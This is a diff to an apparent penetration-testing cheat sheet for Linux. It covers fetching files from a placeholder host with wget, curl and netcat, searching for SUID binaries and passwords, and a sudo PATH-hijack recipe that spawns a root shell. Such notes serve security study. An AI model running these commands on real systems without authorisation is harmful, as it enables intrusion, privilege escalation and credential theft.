@@ -1,4 +1,4 @@
-File Transfers
+## File Transfers
 ```bash
 # wget
 wget http://<ip>/file_name -O /path/to/save/file
@@ -10,6 +10,7 @@ nc -nv <ip> <port> > file/to/recv
 curl http://<ip>/file_name --output file_name
 ```
 
+## Information Gathering
 ```bash
 # Find useable Linux files
 find / -perm -u=s -type f 2>/dev/null
@@ -27,4 +28,18 @@ sudo du -hsx ./* | sort -rh | head -n 40
 ls -la /etc/cron.daily/
 
 grep password -B 5 -A 5 # below 5 above 5
+```
+
+## Abusing Sudo
+Can sudo but absolute path is specified? Use `ltrace` to view libraries being loaded by these programs and check if absolute path is specified or not
+
+```bash
+# Easy win?
+sudo -l # Check programs on GTFOBins
+
+# Can sudo, abosulte path not specified?
+echo "/bin/sh" > <program_name>
+chmod 777 <program_name>
+# Export PATH=.:$PATH
+sudo <program_name>
 ```
